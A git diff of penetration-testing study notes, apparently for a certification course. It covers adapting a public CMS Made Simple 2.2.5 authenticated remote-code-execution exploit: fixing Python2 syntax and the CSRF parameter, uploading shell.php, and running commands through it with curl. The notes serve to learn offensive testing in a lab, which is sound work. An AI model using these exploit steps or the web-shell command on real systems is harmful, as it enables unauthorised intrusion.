@@ -647,6 +647,8 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
      `wine syncbreeze_exploit.exe`
 - **Fixing web exploits**
   - consideration: http/https, specific web path, pre-authentication vulnerability, GET/POST, rely on app setting
+  - syntaxError: Missing parentheses in call to 'print' （it was written for Python2)
+  - ssh and start apache service `ssh root@192.168.171.45` `sudo systemctl start apache2`  
   - selecting vulnerability and fixing the code  (apache2, [CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/44976))
     ```
     base_url = "https://10.11.0.128/admin"
@@ -658,8 +660,10 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
     response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
     ```
-    - 
-  - change
+  - Troubleshooting the "index out of range" Error
+    - Changing the csrf_param variable `csrf_param = "_sk_" # change from "__c"`
+  - [+] Exploit succeeded, shell can be found at: https://192.168.171.45/uploads/shell.php
+  - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
      
 ### 15. Antivirus evasion
 ### 16. Password attacks
